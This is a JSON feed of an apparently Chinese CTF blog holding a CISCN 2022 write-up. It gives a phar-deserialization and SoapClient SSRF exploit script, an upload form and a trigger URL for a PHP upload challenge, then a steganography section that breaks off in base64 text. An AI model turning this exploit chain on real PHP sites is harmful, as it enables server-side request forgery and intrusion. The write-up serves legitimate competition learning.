{
    "version": "https://jsonfeed.org/version/1",
    "title": "Prism Port • All posts by \"ctf\" tag",
    "description": "",
    "home_page_url": "https://www.sycamore.top",
    "items": [
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/BxsTeam-Ciscn2022-WP/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/BxsTeam-Ciscn2022-WP/",
            "title": "BxsTeam Ciscn2022 WP",
            "date_published": "2022-06-20T11:23:14.000Z",
            "content_html": "<h2 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> web</h2>\n<h3 id=\"1welcometociscn\"><a class=\"anchor\" href=\"#1welcometociscn\">#</a> 1.welcomeToCiscn</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMTY2LjE0Nzo1ODAwNS9mbGFn\">http://192.168.166.147:58005/flag</span></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444986/Typera/2023/04/fdc13e831337fd37296da62226314d5c.png\" alt=\"image-20220619093945836\" /></p>\n<p 61ee5435b6f59d42329ac2644d887dc2=\"\">flag</p>\n<h3 id=\"2ezphp\"><a class=\"anchor\" href=\"#2ezphp\">#</a> 2.ezphp</h3>\n<p>WEB 手用 QQ 就能做题，提交 flag 格式：flag {xxxx}，该题环境的 ip 为:web - 模板机 get_ip 的 ip，端口为：58003</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMTY2LjE0Nzo1ODAwMw==\">http://192.168.166.147:58003</span></p>\n<p>打开题目就跳转到腾讯网页面，F12 流量监控也没找到题目正常的返回数据，就用了 Burp 代理</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/71b04071868e94c14ab68545511866d3.png\" alt=\"image-20220619194519069\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1CdXJwd3d3LXZwNGtqNnlmOWR3dDRiY2pibDhzbjEzYjd4NGFvcjNnLnFxLmNvbQ==\">打开 Burp 看到流量发往了 www.qq.com</span>, 手动修改了一下流量目的地址和请求头 host</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444983/Typera/2023/04/404af43648ff7e40324818cb9d0a9580.png\" alt=\"image-20220619194841691\" /></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/6196e0859e1cc306b89e66254f983d62.png\" alt=\"image-20220619195032081\" /></p>\n<p>可以看到这回一个提供文件上传接口的地方，访问一下 <code>upload.php</code>  可以得到源码，但一些字符被 html 编码</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/128a44607394d2e48e0b6fa71a7ac246.png\" alt=\"image-20220619195647524\" /></p>\n<p>到本地写 html 页面访问即可得到源码:</p>\n<p>upload.php</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <span class=\"comment\">//设置编码</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;config.php&quot;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&quot;max_execution_time&quot;</span>,<span class=\"string\">&quot;5&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">//flag in flag.php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>])&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    <span class=\"variable\">$filetype</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$tmp</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$content</span>=<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$tmp</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/&lt;\\?|php/i&quot;</span>, <span class=\"variable\">$content</span> ))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;go away!!!! hacker&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$filepath</span>=<span class=\"string\">&quot;storage/&quot;</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span>( <span class=\"variable\">$filetype</span>==<span class=\"string\">&quot;image/gif&quot;</span> )&#123;</span><br><span class=\"line\">        <span class=\"variable\">$random_name</span>=<span class=\"title function_ invoke__\">substr</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">time</span>()), <span class=\"number\">0</span>, <span class=\"number\">8</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$tmp</span>,<span class=\"variable\">$filepath</span>.<span class=\"variable\">$random_name</span>.<span class=\"string\">&quot;.gif&quot;</span>))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;上传成功:路径在: ./&quot;</span>.<span class=\"variable\">$filepath</span>.<span class=\"variable\">$random_name</span>.<span class=\"string\">&quot;.gif&quot;</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;上传失败&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;invalid gif&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkimg</span>(<span class=\"params\"><span class=\"variable\">$img</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$check</span>=<span class=\"title function_ invoke__\">getimagesize</span>(<span class=\"variable\">$img</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((<span class=\"variable\">$check</span>!=<span class=\"literal\">false</span>) &amp;&amp; (<span class=\"variable\">$check</span>[<span class=\"string\">&#x27;mime&#x27;</span>] == <span class=\"string\">&#x27;image/gif&#x27;</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;safe image&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;go away hacker&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$img</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;img&quot;</span>];    </span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$img</span>))&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">checkimg</span>(<span class=\"variable\">$img</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>config.php</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Mysql</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$conn</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$dbhost</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$dbusername</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$dbpasswd</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;dbhost&#x27;</span>])&amp;&amp;<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;dbusername&#x27;</span>])&amp;&amp;<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;dbpasswd&#x27;</span>]))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;dbhost=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;dbhost&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;dbusername=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;dbusername&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;dbpasswd=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;dbpasswd&#x27;</span>];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">connect</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;conn=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">mysqli</span>(<span class=\"variable\">$this</span>-&gt;dbhost,<span class=\"variable\">$this</span>-&gt;dbusername,<span class=\"variable\">$this</span>-&gt;dbpasswd);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable language_\">$this</span>-&gt;conn-&gt;connect_error)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Connection failed: <span class=\"subst\">&#123;$this-&gt;conn-&gt;connect_error&#125;</span>&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> False;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$result</span>=<span class=\"variable language_\">$this</span>-&gt;conn-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"string\">&quot;select * from test&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">is_resource</span>(<span class=\"variable\">$result</span>))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"variable\">$result</span>-&gt;<span class=\"title function_ invoke__\">fetch_assoc</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> False;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;conn-&gt;<span class=\"title function_ invoke__\">close</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>这里提示了 flag.php 访问一下可以直接得到源码:</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>] == <span class=\"string\">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"string\">&quot;flag.txt&quot;</span>,<span class=\"variable\">$flag</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure></p>\n<p>分析:</p>\n<ol>\n<li>upload.php\n<ol>\n<li>文件类型为 <code>image/gif</code>  且不被正则 <code>&quot;/&lt;\\?|php/i&quot;</code>  匹配到的时候会将文件上上传到 <code>storage/xxxxxxxx.gif</code></li>\n<li>如果有 img 参数的时候会使用 <code>getimagesize</code>  函数获取图片信息</li>\n</ol>\n</li>\n<li>config.php\n<ol>\n<li>只有一个类：Mysql</li>\n<li>它的 connect 函数不可用，能利用的函数只有 <code>__destruct</code> , 在它里面调用了关闭连接的函数 <code>$this-&gt;conn-&gt;close();</code></li>\n</ol>\n</li>\n<li>flag.php\n<ol>\n<li>这里会将 flag 复制到 flag.txt 中，但是必须本地访问才行</li>\n</ol>\n</li>\n</ol>\n<p>解题思路:</p>\n<ol>\n<li>首先明确最后目标：实现 <code>127.0.0.1</code>  访问 <code>flag.php</code></li>\n<li>文件内容正则匹配 php 并且有 <code>getimagesize</code>  函数就很自然想到 phar 反序列化</li>\n<li>反序列化什么类呢？这里给了 <code>Mysql</code>  类，就从它入手，结合最终目的 <code>SSRF</code>  想到原生类利用中的 <code>SoapClient</code> , 销毁函数会调用 <code>conn</code>  成员的 <code>close</code>  函数，就满足 <code>SoapClient</code>  的 <code>__call</code>  函数执行条件</li>\n</ol>\n<p>最终得到解题步骤:</p>\n<ol>\n<li>构造一个 Mysql 对象，让它的 <code>conn</code>  成员访问 <code>http://127.0.0.1/flag.php</code>  的 <code>SoapClient</code>  对象</li>\n<li>将得到的对象放入 Phar 文件的 <code>Metadata</code>  数据段</li>\n<li>为了绕过正则过滤，将原始的 phar 压缩为 <code>.tar.gz</code></li>\n</ol>\n<p>构造实现脚本:</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Mysql</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$conn</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$dbhost</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$dbusername</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$dbpasswd</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$conn</span>, <span class=\"variable\">$dbhost</span>, <span class=\"variable\">$dbusername</span>, <span class=\"variable\">$dbpasswd</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;conn = <span class=\"variable\">$conn</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;dbhost = <span class=\"variable\">$dbhost</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;dbusername = <span class=\"variable\">$dbusername</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;dbpasswd = <span class=\"variable\">$dbpasswd</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destory</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        @<span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&quot;calc&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;conn-&gt;<span class=\"title function_ invoke__\">clase</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$soap</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">SoapClient</span>(<span class=\"literal\">null</span>,<span class=\"keyword\">array</span>(<span class=\"string\">&quot;location&quot;</span>=&gt;<span class=\"string\">&quot;http://127.0.0.1/flag.php&quot;</span>,<span class=\"string\">&quot;uri&quot;</span>=&gt;<span class=\"string\">&quot;http://127.0.0.1/flag.php&quot;</span>));</span><br><span class=\"line\"><span class=\"variable\">$mysql</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Mysql</span>(</span><br><span class=\"line\">    <span class=\"variable\">$soap</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;xxx&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;xxx&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;xxx&quot;</span>,</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$ser</span>=<span class=\"variable\">$mysql</span>;</span><br><span class=\"line\">@<span class=\"title function_ invoke__\">unlink</span>(<span class=\"string\">&quot;phar.gif&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"string\">&quot;phar.phar&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span> = <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">convertToExecutable</span>(<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">TAR</span>,<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">GZ</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>();</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$ser</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;f1ag.txt&quot;</span>,<span class=\"string\">&quot;f1ag&#123;PharData&#125;&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>();</span><br><span class=\"line\">@<span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&quot;move phar.phar.tar.gz phar.gif&quot;</span>);</span><br><span class=\"line\">@<span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&quot;ls|findstr phar&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&quot;phar://./phar.gif/f1ag.txt&quot;</span>);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>运行上面脚本可以获得 <code>phar.gif</code>  并且输出里面的数据，然后可以看到生成的 phar.gif 并没有正则匹配的数据段</p>\n<p>再写一个 form 表单向题目上传文件:</p>\n<p><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://192.168.166.147:58003/upload.php&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;name&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;post&quot;</span> <span class=\"attr\">enctype</span>=<span class=\"string\">&quot;multipart/form-data&quot;</span> <span class=\"attr\">target</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span></span><br><span class=\"line\">    file:<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;file&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;file&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;提交&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444983/Typera/2023/04/928bc6b5a4b37ece34945ec48f050563.png\" alt=\"image-20220619202551241\" /></p>\n<p>上传文件后自动跳转到题目的 <code>/upload.php</code>  下面，得到文件上传地址</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444983/Typera/2023/04/8604d2a808d2a95033b7e47354f02a32.png\" alt=\"image-20220619202710848\" /></p>\n<p>然后使用 phar 协议加载这个文件地址即可触发反序列化</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMTY2LjE0Nzo1ODAwMy91cGxvYWQucGhwP2ltZz1waGFyOi8vLi9zdG9yYWdlL2FlMDhhNjNmLmdpZg==\">http://192.168.166.147:58003/upload.php?img=phar://./storage/ae08a63f.gif</span></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444983/Typera/2023/04/857640a3f076370e147a02fa7830303b.png\" alt=\"image-20220619203123372\" /></p>\n<p>最终会因为反序列化调用 <code>SoapClient</code>  访问 /flag.php 而将 flag 写入 flag.txt, 但是因为我们的文件格式并不是 gif 所以并不会满足 if 条件而输出 <code>go away hacker</code>  但是问题不大，此时去访问 flag.txt 即可得到 flag</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMTY2LjE0Nzo1ODAwMy9mbGFnLnR4dA==\">http://192.168.166.147:58003/flag.txt</span></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444984/Typera/2023/04/111191a5c9016190e8b5bcab43d52be6.png\" alt=\"image-20220619203336153\" /></p>\n<h2 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h2>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> MISC</h2>\n<h3 id=\"pika\"><a class=\"anchor\" href=\"#pika\">#</a> pika</h3>\n<p><code>flag</code> ：flag{d6246d1f41fad032ee30193f3af15408}<br />\n lsb 隐写，RGB0 通道有异常，导出为一个 txt 文件。<br />\n内容如下：</p>\n<blockquote>\n<p>cGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYSBwaXBpIHBpIHBpcGkgcGkgcGkgcGkgcGlwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaXBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpY2h1IHBpY2h1IHBpY2h1IHBpY2h1IGthIGNodSBwaXBpIHBpcGkgcGlwaSBwaXBpIHBpIHBpIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpY2h1IGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIHBpa2FjaHUga2Ega2Ega2Ega2EgcGlrYWNodSBwaSBwaSBwaWthY2h1IHBpIHBpIHBpa2FjaHUgcGlwaSBwaWthY2h1IHBpY2h1IGthIGthIGthIGthIGthIHBpa2FjaHUgcGlwaSBwaSBwaSBwaWthY2h1IHBpY2h1IHBpIHBpIHBpIHBpa2FjaHUga2Ega2Ega2EgcGlrYWNodSBwaXBpIHBpa2FjaHUga2Ega2Ega2Ega2Ega2EgcGlrYWNodSBwaSBwaSBwaSBwaWthY2h1IHBpY2h1IGthIHBpa2FjaHUgcGkgcGkgcGkgc